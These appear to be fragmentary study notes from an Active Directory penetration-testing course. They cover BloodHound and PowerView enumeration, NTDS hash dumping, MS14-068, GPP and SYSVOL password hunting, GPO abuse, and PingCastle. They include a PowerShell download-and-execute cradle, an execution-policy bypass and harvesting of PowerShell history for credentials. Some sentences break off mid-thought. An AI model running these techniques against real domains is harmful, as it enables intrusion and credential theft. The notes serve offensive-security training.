==**TOOLS**==

| Tool | Description |
| --- | --- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment. |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/).

### Identifying Hosts

First, let's take some time to listen to the network and see what's going on. We can use `Wireshark` and `TCPDump` to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box." We notice some [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies, [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS), and other basic [layer two](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.

## Detailed User Enumeration

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

## Harnessing PowerShell

&nbsp;

| **Cmd-Let** | **Description** |
| --- | --- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` |     |

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525%28v=ws.11%29) /netonly.

&nbsp;We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

&nbsp;

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.

&nbsp;

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

Code: cypher

# Kerberos "Double Hop" Problem in winrm

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

Kerberos "Double Hop" Problem

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

&nbsp;

&nbsp;

Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

## MS14-068

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerabilit

## Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named `reset_local_admin_pass.vbs`.

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

## Group Policy Object (GPO) Abuse

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

# Additional AD Auditing Techniques

#### Creating a Snapshot of AD with AD Explorer

![a08c0e361f668a32be8fb58829bfc915.png](/resources/a08c0e361f668a32be8fb58829bfc915.png)

## PingCastle

[PingCastle](https://www.pingcastle.com/documentation/) is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the [Capability Maturity Model Integration](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) (CMMI). For a quick look at the help context provided, you can issue the `--help` switch in cmd-promp

&nbsp;

&nbsp;

```cmd-session
C:\local> PingCastle.exe --help

switch:
  --help              : display this message
  --interactive       : force the interactive mode
  --log               : generate a log file
  --log-console       : add log to the console
  --log-samba <option>: enable samba login (example: 10)

Common options when connecting to the AD
  --server <server>   : use this server (default: current domain controller)
                        the special value * or *.forest do the healthcheck for all domains
  --port <port>       : the port to use for ADWS or LDAP (default: 9389 or 389)
  --user <user>       : use this user (default: integrated authentication)
  --password <pass>   : use this password (default: asked on a secure prompt)
  --protocol <proto>  : selection the protocol to use among LDAP or ADWS (fastest)
                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS
```

## Group3r

[Group3r](https://github.com/Group3r/Group3r) is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using `runas /netonly`).

#### Group3r Basic Usage

Additional AD Auditing Techniques

```cmd-session
C:\local> group3r.exe -f <filepath-name.log
```
